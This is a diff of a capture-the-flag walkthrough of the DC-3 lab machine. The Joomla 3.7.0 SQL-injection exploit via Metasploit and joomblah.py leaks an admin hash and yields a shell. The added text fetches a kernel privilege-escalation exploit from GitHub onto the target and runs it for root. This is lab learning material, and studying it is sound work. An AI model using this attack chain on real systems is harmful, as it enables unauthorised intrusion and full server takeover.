@@ -30,12 +30,12 @@ By DCAU
 * Next, I tried to access the 4 directory listings that were shown and we are actually able to see the various directories and files within them!
 * This was my first encounter with the Joomla CMS and I was not quite sure what to look out for, even if I had access to directories and files, unlike for example WordPress - where I knew that I would hunt for files like wp-config.php.
 * However, we do know from `joomscan` that the Joomla CMS on this site was version `3.7.0`. I googled to see if there were exploits for this version of Joomla, and found the [Joomla Component Fields SQLi Remote Code Execution](https://www.rapid7.com/db/modules/exploit/unix/webapp/joomla_comfields_sqli_rce).
-* I opened `msfconsole` and ran `use exploit/unix/webapp/joomla_comfields_sqli_rce`. Opening up the options, I set the RHOST to be `10.0.2.8` (**to be edited**):
+* I opened `msfconsole` and ran `use exploit/unix/webapp/joomla_comfields_sqli_rce`. After running `show options`, I `set RHOST 10.0.2.8` (**to be edited**):
 ![](/screenshots/dc-3/msfconsoleJoomlaOptions.jpg)
 * However, upon running `exploit`, we see that no session was created because there was "no logged-in Administrator or Super User user found":
-![](/screenshots/dc-3/msfconsoleJoomlaExploit.jpg)
-* I am guessing that there are no users logged in at the moment, or at least there are no users which have administrative privileges who are logged in.
-* I googled further and found a proof-of-concept exploit for the same vulnerability at this [https://github.com/XiphosResearch/exploits/tree/master/Joomblah](GitHub link).
+![](/screenshots/dc-3/msfconsoleJoomlaExploitFailed.jpg)
+* This tells us that there are no users logged in at the moment, or at least there are no users which have administrative privileges who are logged in.
+* I googled further and found a proof-of-concept exploit for the same vulnerability at this [GitHub link](https://github.com/XiphosResearch/exploits/tree/master/Joomblah).
 * Clone the Git repository, and run `python joomblah.py http://10.0.2.8` (**to be edited**):
 ![](/screenshots/dc-3/joomblahOutput.jpg)
 * Within a few seconds, we get to know that the user `admin` exists, along with his password hash `$2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu`.
@@ -53,4 +53,38 @@ By DCAU
 ![](/screenshots/dc-3/hashcatError.jpg)
 * We are now able to log in to `http://10.0.2.8/administrator/`:
 ![](/screenshots/dc-3/loginAdmin.jpg)
-* To-be-continued...
+* After logging in, I poked around the articles, categories, modules, plugins, etc. but did not quite seem to find information that was useful to me. This was my first time inside a Joomla CMS administrator panel and I was probably just groping in the dark.
+* I remembered the exploit session which we attempted earlier using `msfconsole` and decided to head back for a shot at it:
+![](/screenshots/dc-3/msfconsoleJoomlaExploitSuccess.jpg)
+* We were able to establish a meterpreter session this time because we are logged in as `admin`.
+* Note: If you encounter the same error as before (no logged-in administrator user), refresh your administrator panel on your web browser to confirm that you are still logged in, just before you run `exploit`.
+* Run `shell`, then `whoami` and we find that we are `www-data` as expected.
+* Enter `python -c 'import pty; pty.spawn("/bin/bash")'` to spawn our interactive TTY shell and we find ourselves within `/var/www/html/templates/beez3`.
+* I ran `find / -user root -perm -4000 -print 2>/dev/null` to search for setuid binaries which we could possibly exploit to gain root access:
+![](/screenshots/dc-3/setuidBinaries.jpg)
+* Nothing much really stood out to me. `pkexec` stood out to me, probably because I never saw it before. I googled about exploits relating to it, which was [available](https://www.exploit-db.com/exploits/17932) provided that the version running was <= 0.101. Running `pkexec --version` revealed that our version was `0.105`.
+* I navigated to the `/home` directory and found several files for user `dc3`:
+![](/screenshots/dc-3/dc3Files.jpg)
+* The file `.sudo_as_admin_successful` stood out, but it was an empty file. Perhaps it is a hint? I opened up the `/cat/passwd` file to see if there was any user `admin`:
+![](/screenshots/dc-3/passwdFile.jpg)
+* Since there was no user `admin`, I was not quite sure what the file name meant. Perhaps admin referred to root.
+* Nonetheless, we did confirm that there is a user `dc3`.
+* At this point I was pretty much stuck on how I should be moving forward and referred to existing walkthroughs of DC-3, and found that one exploit to getting root was through a vulnerability in the web server's OS. This was getting interesting - I had never tried something like that before.
+* To find out what OS version the web server is running, execute `cat /etc/issue; uname -a`:
+![](/screenshots/dc-3/vulnerableOSVersion.jpg)
+* We see that the web server is running on `Ubuntu 16.04 LTS`.
+* Run `searchsploit Ubuntu 16.04` to find out if there are any existing exploits for this version of Ubuntu:
+![](/screenshots/dc-3/searchsploitUbuntu.jpg)
+* We will be using 'double-fdput()' bpf(BPF_PROG_LOAD) Privilege Escalation from the list of available exploits.
+* Run `cat /usr/share/exploitdb/exploits/linux/local/39772.txt` to see the details of the exploit.
+* Download the .zip file for this exploit from [this GitHub link](https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip) on the `/tmp` directory of the vulnerable web server.
+* Run `unzip 39772.zip` to unzip the file, and we find `crasher.tar` and `exploit.tar`. At this point we are not exactly sure how we should be handling the files so I referred back to 39772.txt on how the files should be used:
+![](/screenshots/dc-3/exploitUsage.jpg)
+* Since we are looking at `exploit.tar`, run `tar -xvf exploit.tar` to extract its contents, which gives us the directory `ebpf_mapfd_doubleput_exploit`:
+![](/screenshots/dc-3/doubleputExploitDirectory.jpg)
+* Following the instructions in 39772.txt, run `./compile.sh`, which is a script that compiles the 3 C programs.
+* Next, run `./doubleput`, and we have our root access:
+![](/screenshots/dc-3/rootAccess.jpg)
+* Head to `/root` directory, and we find `the-flag.txt`:
+![](/screenshots/dc-3/flag.jpg)
+* Hurray, we are done with this challenge!
